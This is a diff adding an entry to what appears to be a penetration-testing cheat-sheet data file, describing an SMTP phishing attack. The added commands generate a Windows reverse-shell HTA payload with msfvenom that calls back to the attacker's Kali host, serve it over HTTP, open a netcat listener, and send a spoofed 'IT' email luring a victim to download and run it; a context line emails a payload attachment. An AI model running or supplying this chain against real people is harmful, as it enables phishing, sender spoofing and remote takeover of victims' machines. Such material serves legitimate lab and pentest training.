@@ -48,6 +48,17 @@
           "commands": [
             "sendemail -f \"it@corp.local\" -t \"victim@corp.local\" -u \"Action required\" -m \"See attached.\" -s {target_ip}:25 -a payload.pdf"
           ]
+        },
+        {
+          "id": "smtp_phishing_link",
+          "title": "Phishing Link Payload (Instead of Attachment)",
+          "description": "Some mail filters strip executable attachments but not links. Host a payload (HTA, exe, or macro doc) on Kali, start a listener, then email the link so the victim downloads and runs it themselves.",
+          "commands": [
+            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f hta-psh -o payload.hta",
+            "python3 -m http.server 8000",
+            "sudo rlwrap nc -lvnp 4444",
+            "sendemail -f \"it@corp.local\" -t \"victim@corp.local\" -u \"Action required\" -m \"Please review: http://<Kali_IP>:8000/payload.hta\" -s {target_ip}:25"
+          ]
         }
       ]
     }
